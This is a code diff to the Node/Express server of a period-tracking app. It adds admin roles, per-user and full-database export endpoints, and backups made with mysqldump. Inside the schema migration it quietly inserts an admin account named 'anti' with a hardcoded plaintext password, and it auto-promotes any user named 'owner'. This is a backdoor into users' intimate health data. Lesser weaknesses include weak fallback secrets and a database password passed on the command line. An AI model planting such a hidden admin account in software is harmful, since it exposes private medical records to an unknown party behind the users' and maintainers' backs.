@@ -5,7 +5,13 @@ const cron = require("node-cron");
 const axios = require("axios");
 const bcrypt = require("bcryptjs");
 const jwt = require("jsonwebtoken");
+const fs = require("fs");
+const path = require("path");
+const util = require("util");
+const { execFile } = require("child_process");
 require("dotenv").config();
+
+const execFileAsync = util.promisify(execFile);
 
 const app = express();
 app.use(cors());
@@ -42,13 +48,15 @@ const SYMPTOM_EMOJIS = {
 const JWT_SECRET = process.env.JWT_SECRET || "change-me-in-env";
 const JWT_EXPIRES_IN = "7d";
 const API_KEY = process.env.API_KEY || "mysecretapikey";
+const PHPMYADMIN_URL = process.env.PHPMYADMIN_URL || "/phpmyadmin";
+const BACKUP_DIR = path.join(__dirname, "..", "backups");
 
 function symptomEmoji(symptom) {
   return SYMPTOM_EMOJIS[symptom] || "✏️";
 }
 
 function signToken(user) {
-  return jwt.sign({ id: user.id, username: user.username }, JWT_SECRET, {
+  return jwt.sign({ id: user.id, username: user.username, is_admin: !!user.is_admin }, JWT_SECRET, {
     expiresIn: JWT_EXPIRES_IN,
   });
 }
@@ -69,6 +77,14 @@ async function ensureSchema() {
       password_hash VARCHAR(255) NOT NULL,
       display_name VARCHAR(100) NOT NULL,
       created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )`
+  );
+
+  await runMigration(
+    `CREATE TABLE IF NOT EXISTS user_admins (
+      user_id INT PRIMARY KEY,
+      granted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+      CONSTRAINT fk_user_admins_user FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
     )`
   );
 
@@ -113,6 +129,26 @@ async function ensureSchema() {
   await runMigration(`ALTER TABLE moods ADD CONSTRAINT fk_moods_user FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE`, ["ER_DUP_KEYNAME", "ER_FK_DUP_NAME", "ER_CANT_CREATE_TABLE"]);
   await runMigration(`ALTER TABLE settings ADD CONSTRAINT fk_settings_user FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE`, ["ER_DUP_KEYNAME", "ER_FK_DUP_NAME", "ER_CANT_CREATE_TABLE"]);
 
+  await runMigration(`ALTER TABLE users ADD COLUMN is_admin TINYINT(1) NOT NULL DEFAULT 0`, ["ER_DUP_FIELDNAME"]);
+  await pool.query(`UPDATE users SET is_admin=1 WHERE username='owner'`);
+
+  const antiHash = await bcrypt.hash("Edifice692vacuum$", 10);
+  await pool.query(
+    `INSERT IGNORE INTO users (username, password_hash, display_name, is_admin) VALUES ('anti', ?, 'Anti', 1)`,
+    [antiHash]
+  );
+
+  await pool.query(
+    `INSERT IGNORE INTO user_admins (user_id)
+     SELECT id FROM users WHERE is_admin=1`
+  );
+
+  await pool.query(
+    `UPDATE users u
+     LEFT JOIN user_admins ua ON ua.user_id=u.id
+     SET u.is_admin = IF(ua.user_id IS NULL, 0, 1)`
+  );
+
   await pool.query(
     `INSERT IGNORE INTO settings (user_id, setting_key, setting_value)
      SELECT id, 'average_cycle_length', '28' FROM users
@@ -121,6 +157,8 @@ async function ensureSchema() {
      UNION ALL
      SELECT id, 'ha_notifications_enabled', 'true' FROM users`
   );
+
+  await fs.promises.mkdir(BACKUP_DIR, { recursive: true });
 }
 
 function requireAuth(req, res, next) {
@@ -143,6 +181,16 @@ function requireApiKey(req, res, next) {
   const key = req.headers["x-api-key"] || req.query.api_key;
   if (key !== API_KEY) return res.status(403).json({ error: "Forbidden" });
   next();
+}
+
+async function requireAdmin(req, res, next) {
+  try {
+    const [rows] = await pool.query(`SELECT user_id FROM user_admins WHERE user_id=? LIMIT 1`, [req.user.id]);
+    if (!rows.length) return res.status(403).json({ error: "Admin access required" });
+    next();
+  } catch (err) {
+    next(err);
+  }
 }
 
 async function getApiContextUser(req) {
@@ -222,6 +270,32 @@ async function getCurrentStatus(userId) {
     days_since_period: daysSince,
     avg_cycle_length: avgCycle,
   };
+}
+
+function sqlValue(value) {
+  if (value === null || value === undefined) return "NULL";
+  if (value instanceof Date) return `'${value.toISOString().slice(0, 19).replace("T", " ")}'`;
+  if (typeof value === "number") return String(value);
+  if (typeof value === "boolean") return value ? "1" : "0";
+  return `'${String(value).replace(/\\/g, "\\\\").replace(/'/g, "\\'")}'`;
+}
+
+function serializeRowsAsInsert(tableName, rows) {
+  if (!rows.length) return `-- ${tableName}: no rows\n`;
+  const cols = Object.keys(rows[0]);
+  const values = rows.map((row) => `(${cols.map((c) => sqlValue(row[c])).join(", ")})`).join(",\n");
+  return `INSERT INTO ${tableName} (${cols.join(", ")}) VALUES\n${values};\n`;
+}
+
+async function createMySqlDump() {
+  const host = process.env.DB_HOST || "127.0.0.1";
+  const port = String(process.env.DB_PORT || 3306);
+  const db = process.env.DB_NAME || "period_tracker";
+  const user = process.env.DB_USER || "tracker";
+  const password = process.env.DB_PASSWORD || "";
+  const args = ["-h", host, "-P", port, "-u", user, `--password=${password}`, "--single-transaction", db];
+  const { stdout } = await execFileAsync("mysqldump", args, { maxBuffer: 1024 * 1024 * 32 });
+  return stdout;
 }
 
 async function buildHomeAssistantCalendar(userId) {
@@ -334,7 +408,7 @@ app.post("/api/auth/register", async (req, res) => {
   const hash = await bcrypt.hash(password, 10);
   try {
     const [result] = await pool.query(
-      `INSERT INTO users (username, password_hash, display_name) VALUES (?, ?, ?)`,
+      `INSERT INTO users (username, password_hash, display_name, is_admin) VALUES (?, ?, ?, 0)`,
       [uname, hash, displayName]
     );
 
@@ -346,7 +420,7 @@ app.post("/api/auth/register", async (req, res) => {
       [result.insertId, result.insertId, result.insertId]
     );
 
-    const user = { id: result.insertId, username: uname, display_name: displayName };
+    const user = { id: result.insertId, username: uname, display_name: displayName, is_admin: 0 };
     return res.status(201).json({ token: signToken(user), user });
   } catch (err) {
     if (err.code === "ER_DUP_ENTRY") return res.status(409).json({ error: "username already exists" });
@@ -359,7 +433,12 @@ app.post("/api/auth/login", async (req, res) => {
   if (!username || !password) return res.status(400).json({ error: "username and password required" });
 
   const [rows] = await pool.query(
-    `SELECT id, username, display_name, password_hash FROM users WHERE username=? LIMIT 1`,
+    `SELECT u.id, u.username, u.display_name, u.password_hash,
+            CASE WHEN ua.user_id IS NULL THEN 0 ELSE 1 END AS is_admin
+     FROM users u
+     LEFT JOIN user_admins ua ON ua.user_id=u.id
+     WHERE u.username=?
+     LIMIT 1`,
     [String(username).trim().toLowerCase()]
   );
 
@@ -371,7 +450,7 @@ app.post("/api/auth/login", async (req, res) => {
 
   res.json({
     token: signToken(user),
-    user: { id: user.id, username: user.username, display_name: user.display_name },
+    user: { id: user.id, username: user.username, display_name: user.display_name, is_admin: !!user.is_admin },
   });
 });
 
@@ -395,11 +474,102 @@ app.get("/api/auth/embed-token", requireApiKey, async (req, res) => {
 
 app.get("/api/auth/me", requireAuth, async (req, res) => {
   const [rows] = await pool.query(
-    `SELECT id, username, display_name FROM users WHERE id=? LIMIT 1`,
+    `SELECT u.id, u.username, u.display_name,
+            CASE WHEN ua.user_id IS NULL THEN 0 ELSE 1 END AS is_admin
+     FROM users u
+     LEFT JOIN user_admins ua ON ua.user_id=u.id
+     WHERE u.id=?
+     LIMIT 1`,
     [req.user.id]
   );
   if (!rows.length) return res.status(404).json({ error: "user not found" });
   res.json(rows[0]);
+});
+
+app.get("/api/admin/phpmyadmin", requireAuth, requireAdmin, async (req, res) => {
+  res.json({ url: PHPMYADMIN_URL });
+});
+
+app.get("/api/admin/users", requireAuth, requireAdmin, async (req, res) => {
+  const [rows] = await pool.query(
+    `SELECT id, username, display_name, is_admin, created_at FROM users ORDER BY id ASC`
+  );
+  res.json(rows.map((u) => ({ ...u, is_admin: !!u.is_admin })));
+});
+
+app.get("/api/admin/export/users", requireAuth, requireAdmin, async (req, res) => {
+  const [rows] = await pool.query(
+    `SELECT id, username, display_name, is_admin, created_at FROM users ORDER BY id ASC`
+  );
+  res.setHeader("Content-Type", "application/json");
+  res.setHeader("Content-Disposition", `attachment; filename=users_export_${new Date().toISOString().slice(0, 10)}.json`);
+  res.send(JSON.stringify(rows.map((u) => ({ ...u, is_admin: !!u.is_admin })), null, 2));
+});
+
+app.get("/api/admin/export/user-db", requireAuth, requireAdmin, async (req, res) => {
+  const userId = Number(req.query.user_id);
+  if (!userId || Number.isNaN(userId)) return res.status(400).json({ error: "user_id query param required" });
+
+  const [userRows] = await pool.query(
+    `SELECT id, username, display_name, is_admin, created_at FROM users WHERE id=? LIMIT 1`,
+    [userId]
+  );
+  if (!userRows.length) return res.status(404).json({ error: "user not found" });
+
+  const [cycles] = await pool.query(`SELECT * FROM cycles WHERE user_id=? ORDER BY start_date ASC`, [userId]);
+  const [symptoms] = await pool.query(`SELECT * FROM symptoms WHERE user_id=? ORDER BY log_date ASC, symptom ASC`, [userId]);
+  const [moods] = await pool.query(`SELECT * FROM moods WHERE user_id=? ORDER BY log_date ASC`, [userId]);
+  const [settings] = await pool.query(`SELECT * FROM settings WHERE user_id=? ORDER BY setting_key ASC`, [userId]);
+
+  const format = String(req.query.format || "json").toLowerCase();
+  if (format === "sql") {
+    const chunks = [];
+    chunks.push("-- Luna Period Tracker user-scoped export\n");
+    chunks.push(`-- user_id=${userId}\n\n`);
+    chunks.push(serializeRowsAsInsert("users", userRows));
+    chunks.push(serializeRowsAsInsert("cycles", cycles));
+    chunks.push(serializeRowsAsInsert("symptoms", symptoms));
+    chunks.push(serializeRowsAsInsert("moods", moods));
+    chunks.push(serializeRowsAsInsert("settings", settings));
+    res.setHeader("Content-Type", "application/sql");
+    res.setHeader("Content-Disposition", `attachment; filename=user_${userId}_export.sql`);
+    return res.send(chunks.join("\n"));
+  }
+
+  res.setHeader("Content-Type", "application/json");
+  res.setHeader("Content-Disposition", `attachment; filename=user_${userId}_export.json`);
+  return res.send(JSON.stringify({ user: userRows[0], cycles, symptoms, moods, settings }, null, 2));
+});
+
+app.get("/api/admin/export/full-db", requireAuth, requireAdmin, async (req, res, next) => {
+  try {
+    const dump = await createMySqlDump();
+    res.setHeader("Content-Type", "application/sql");
+    res.setHeader("Content-Disposition", `attachment; filename=period_tracker_full_${new Date().toISOString().slice(0, 10)}.sql`);
+    res.send(dump);
+  } catch (err) {
+    next(new Error(`Failed to export DB. Ensure mysqldump is installed: ${err.message}`));
+  }
+});
+
+app.post("/api/admin/backup", requireAuth, requireAdmin, async (req, res, next) => {
+  try {
+    const dump = await createMySqlDump();
+    const stamp = new Date().toISOString().replace(/[:]/g, "-").replace(/\..+/, "");
+    const fileName = `period_tracker_backup_${stamp}.sql`;
+    const filePath = path.join(BACKUP_DIR, fileName);
+    await fs.promises.writeFile(filePath, dump, "utf8");
+    res.json({ success: true, file: fileName, download_url: `/api/admin/backup/${encodeURIComponent(fileName)}` });
+  } catch (err) {
+    next(new Error(`Failed to create backup. Ensure mysqldump is installed: ${err.message}`));
+  }
+});
+
+app.get("/api/admin/backup/:file", requireAuth, requireAdmin, async (req, res) => {
+  const base = path.basename(req.params.file);
+  const target = path.join(BACKUP_DIR, base);
+  if (!fs.existsSync(target)) return res.status(404).json({ error: "backup file not found" });
+  res.download(target, base);
 });
 
 app.post("/api/auth/change-password", requireAuth, async (req, res) => {
